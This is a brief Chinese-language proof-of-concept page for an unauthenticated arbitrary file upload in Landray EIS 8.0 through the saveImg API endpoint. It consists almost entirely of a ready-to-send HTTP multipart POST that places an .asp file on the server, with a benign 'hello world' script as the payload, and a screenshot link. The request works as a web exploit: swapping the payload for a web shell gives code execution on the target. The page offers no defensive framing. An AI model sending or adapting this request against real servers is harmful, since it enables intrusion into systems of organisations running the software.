# 蓝凌 eis 8.0 saveImg 前台任意文件上传

    ## poc

```
POST /eis/service/api.aspx?action=saveImg HTTP/1.1
Host: xxx
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Length: 219
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarysG3y2koDU2TcfA0W
Upgrade-Insecure-Requests: 1

------WebKitFormBoundarysG3y2koDU2TcfA0W
Content-Disposition: form-data; name="file"filename="hp01rxysup.asp"
Content-Type: text/html

<% response.write("hello world")%>
------WebKitFormBoundarysG3y2koDU2TcfA0W--

```

![image](https://s1.ax1x.com/2023/08/11/pPnJ7Lj.png)
